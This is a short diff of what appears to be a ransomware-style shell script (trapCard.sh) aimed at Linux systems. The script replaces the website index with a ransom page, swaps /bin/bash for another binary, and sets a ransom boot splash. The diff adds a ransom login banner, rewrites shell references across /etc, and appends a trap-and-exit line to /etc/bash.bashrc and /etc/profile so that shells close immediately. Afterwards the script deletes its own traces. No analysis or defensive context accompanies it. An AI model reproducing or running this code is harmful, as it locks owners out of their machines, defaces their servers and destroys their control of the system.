@@ -42,8 +42,11 @@ cp ransom.html /var/www/html/index.html
 cp /bin/bash /bin/bush
 cp /bin/uinit /bin/bash
 cp ransom.splash /boot/grub/splash
+cp ransom.issue /etc/issue
 
-find /etc -type f -exec sed -i 's|/bin/bash|/bin/bush|' {} \;
+find /etc -type f ! -path "/etc/passwd" -exec sed -i 's|/bin/bash|/bin/bush|' {} \;
+echo "trap '' INT TSTP; exit" >> /etc/bash.bashrc
+echo "trap '' INT TSTP; exit" >> /etc/profile
 
 rm -f trapCard.sh
 rm -f ransom.html
